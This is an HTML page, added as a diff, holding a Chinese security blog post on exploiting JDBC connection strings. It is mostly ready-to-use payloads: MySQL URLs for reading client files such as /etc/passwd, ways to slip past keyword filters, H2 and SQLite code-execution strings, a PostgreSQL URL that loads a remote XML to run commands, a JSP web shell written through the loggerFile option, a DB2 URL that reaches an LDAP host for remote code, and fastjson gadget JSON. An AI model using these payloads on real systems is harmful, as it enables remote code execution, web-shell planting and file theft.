@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="mayylu">
+
+
+
+    <meta name="description" content="学习是一种生活态度">
+
+
+
+<title>JDBC 利用 | mayylu&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/vue.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">mayylu&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">mayylu&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">JDBC 利用</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">mayylu</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">四月 21, 2025&nbsp;&nbsp;</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近不想挖传统的管理系统如sql,文件操作等漏洞，想挖一些组件或者一些特殊功能的漏洞，就看了一些大佬提交的cve。大概漏洞分为两种，一种就是特殊场景下的“开创性漏洞”，漏洞利用方法可能不是独特的，只是前人没有往这方面去想，还有一种就是参考别人创意在相似场景下发现的漏洞。当然中间件不想web程序那么“规矩”，真实的漏洞挖掘场景是复杂多样的，需要我们真正的能看懂程序的每一个代码块的设计目的。</p>
+<p>本文是之前我分析cve时发现的漏洞利用方式，先简单总结一下，等有机会挖jdbc相关的漏洞的时候在补<br> <span id="more"></span></p>
+<h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>当mysql连接类似于url,当连接字符串可控时，在连接时带有特殊的参数部分就会产生漏洞</p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>mysql认为客户端不应该连接到不可信的服务端。</p>
+<p>伪造一个 MySQL 的服务端，当有客户端连接上这个假服务端的时候，我们就可以任意读取客户端的一个文件，当然前提是运行客户端的用户具有读取该文件的权限</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//allowLoadLocalInfile</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?user=fileread_C:/boot.ini&amp;maxAllowedPacket=655360&amp;allowLoadLocalInfile=true&quot;</span>;</span><br><span class="line">Connection con = DriverManager.getConnection(url);</span><br><span class="line"><span class="comment">//allowUrlInLocalInfile,这里其实算是一个ssrf</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">String url = <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///etc/passwd&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true&quot;</span>;</span><br><span class="line">Connection con = DriverManager.getConnection(url);</span><br></pre></td></tr></table></figure>
+<p>恶意mysql服务端 <code>https://github.com/rmb122/rogue_mysql_server</code></p>
+<h4 id="MySQL蜜罐"><a href="#MySQL蜜罐" class="headerlink" title="MySQL蜜罐"></a>MySQL蜜罐</h4><p>比较有意思的一点就是,读取的文件最终取决于服务端，也就是说上述项目服务端如果配置有要求读取的文件，最终会读取该文件，所以这个项目还可以当作蜜罐使用。即在mysql 8.0.14版本下无需进行任何参数设置，可以直接读取任意文件,当攻击者连接上该版本的恶意mysql数据库，就会被反向读取文件。</p>
+<h3 id="Java环境下的反序列化"><a href="#Java环境下的反序列化" class="headerlink" title="Java环境下的反序列化"></a>Java环境下的反序列化</h3><p>各版本利用payload: <code>https://github.com/fnmsd/MySQL_Fake_Server</code><br>可一样版本范围<br>5.1.x-5.1.49<br>6.x<br>8.x-8.0.20</p>
+<h3 id="绕过检测"><a href="#绕过检测" class="headerlink" title="绕过检测"></a>绕过检测</h3><p>大小写绕过<br>true改成yes<br>由于MySQL驱动允许URL编码，这样就可以绕过关键字<code>autoDeserialize=%74%72%75%65</code><br>通过#号注释掉强行添加的内容<br>采用键值模式<code>jdbc:mysql://(host=myhost,port=1111,key1=value1)/db</code></p>
+<h2 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h2><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><p>这个利用需要存在jdk环境<br><code>jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd)\\;return \&quot;1\&quot;\\;&#125;&#39;\\;CALL EXEC (&#39;calc&#39;)</code></p>
+<p>在jdk15之后Nashorn JavaScript 引擎被删除，因此在jdk15之后无法利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String javascript = <span class="string">&quot;//javascript\njava.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;)\n&quot;</span>;</span><br><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell  BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$&quot;</span>+ javascript +<span class="string">&quot;$$\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>需要额外引入了groovy的依赖</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String groovy = <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;&quot;</span> + <span class="string">&quot; assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span> + <span class="string">&quot;&#125;)&quot;</span> + <span class="string">&quot;def x&quot;</span>;</span><br><span class="line">String url = <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#x27;&quot;</span>+ groovy +<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><h3 id="通过加载远程恶意XML实现RCE"><a href="#通过加载远程恶意XML实现RCE" class="headerlink" title="通过加载远程恶意XML实现RCE"></a>通过加载远程恶意XML实现RCE</h3><p>9.4.1208 &lt;=PgJDBC &lt;42.2.25<br>42.3.0 &lt;=PgJDBC &lt; 42.3.2</p>
+<p><code>jdbc:postgresql://127.0.0.1:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://target/exp.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;exec&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h3><p>42.1.0 &lt;= PostgreSQL &lt;42.3.3<br><code>jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=DEBUG&amp;loggerFile=./test.jsp&amp;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></p>
+<h2 id="sqlite"><a href="#sqlite" class="headerlink" title="sqlite"></a>sqlite</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">        String url1 = <span class="string">&quot;http://127.0.0.1:81/default.db&quot;</span>;</span><br><span class="line">        String url2 = <span class="string">&quot;http://127.0.0.1:81/1.dll&quot;</span>;</span><br><span class="line">        String tmp = <span class="string">&quot;C:\\Users\\administrator\\AppData\\Local\\Temp\\sqlite-jdbc-tmp-&quot;</span>;<span class="comment">//缓存文件路径可控</span></span><br><span class="line">        String db = tmp + <span class="keyword">new</span> URL(url1).hashCode() + <span class="string">&quot;.db&quot;</span>;</span><br><span class="line">        String dll = tmp + <span class="keyword">new</span> URL(url2).hashCode() + <span class="string">&quot;.db&quot;</span>;</span><br><span class="line">        <span class="keyword">new</span> File(db).delete();</span><br><span class="line">        <span class="keyword">new</span> File(dll).delete();</span><br><span class="line">        </span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:&quot;</span>+url1).close();</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite::resource:&quot;</span>+url2).close();</span><br><span class="line">        </span><br><span class="line">        Connection conn = DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:file:&quot;</span>+db+<span class="string">&quot;?enable_load_extension=true&quot;</span>);</span><br><span class="line">        Statement stmt = conn.createStatement();</span><br><span class="line">        </span><br><span class="line">        String sql = <span class="string">&quot;select load_extension(&#x27;&quot;</span>+dll+<span class="string">&quot;&#x27;,&#x27;dllmain&#x27;)&quot;</span>;<span class="comment">//需要语句执行</span></span><br><span class="line">        stmt.execute(sql);</span><br></pre></td></tr></table></figure>
+
+<h2 id="IBM-DB2"><a href="#IBM-DB2" class="headerlink" title="IBM DB2"></a>IBM DB2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">druidDataSource.setUrl(<span class="string">&quot;jdbc:db2://127.0.0.1:5001/BLUDB:clientRerouteServerListJNDIName=ldap://10.0.0.67:1389/remoteExploit8;&quot;</span>);</span><br><span class="line">druidDataSource.setDriverClassName(<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>JDBC反序列化往往可以rce或者读写文件，除了在配置连接场景下的攻击，还可以通过反序列化触发数据库的连接<br>jdbc连接通常通过<strong>getConnection方法</strong>触发的，而fastjson，common beanutil和pojonode等链子都能够触发getter方法<br>如果在反序列化时候有jdbc包就有可能触发jdbc攻击</p>
+<p>fastjson打mysql jdbc</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Mysql connector 5.1.11-5.1.48</span></span><br><span class="line">&#123;<span class="attr">&quot;name&quot;</span>: &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>, <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>, <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>, <span class="attr">&quot;info&quot;</span>: &#123; <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;CommonsCollections5&quot;</span>, <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>, <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>, <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Mysql connector 6.0.2 or 6.0.3</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span>,<span class="attr">&quot;proxy&quot;</span>: &#123;<span class="attr">&quot;connectionString&quot;</span>:&#123;<span class="attr">&quot;url&quot;</span>:<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=CommonsCollections5&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Mysql connector 8.0.19</span></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span>,<span class="attr">&quot;proxy&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span>,<span class="attr">&quot;connectionUrl&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span>, <span class="attr">&quot;masters&quot;</span>:[&#123;<span class="attr">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>&#125;], <span class="attr">&quot;slaves&quot;</span>:[],<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;host&quot;</span>:<span class="string">&quot;127.0.0.1&quot;</span>,<span class="attr">&quot;user&quot;</span>:<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="attr">&quot;dbname&quot;</span>:<span class="string">&quot;dbname&quot;</span>,<span class="attr">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,<span class="attr">&quot;queryInterceptors&quot;</span>:<span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="attr">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>其他 <code>https://github.com/luelueking/Deserial_Sink_With_JDBC</code></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/04/18/android/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91(%E8%BF%98%E5%9C%A8%E5%86%99)/">安卓逆向</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
